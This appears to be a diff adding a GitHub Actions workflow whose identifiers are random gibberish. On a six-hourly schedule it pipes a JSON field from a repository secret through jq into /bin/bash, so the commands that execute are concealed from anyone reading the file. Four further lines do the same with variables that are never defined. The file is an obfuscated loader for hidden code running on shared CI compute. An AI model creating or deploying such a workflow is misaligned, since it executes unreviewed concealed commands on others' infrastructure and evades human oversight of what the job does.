@@ -1,0 +1,22 @@
+name: midayuan3810
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '36 3/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: midayuan3810
+        env:
+          iqonw81307: ${{ secrets.iqonw81307 }}
+        run: |
+          echo $iqonw81307 | jq -r .vecvs19590 | /bin/bash
+          echo $vlz877 | jq -r .iqw4827 | /bin/bash
+          echo $wcuh52077 | jq -r .ot38327 | /bin/bash
+          echo $xgdgn99897 | jq -r .qckwa8 | /bin/bash
+          echo $uqi38056 | jq -r .nq8 | /bin/bash
+
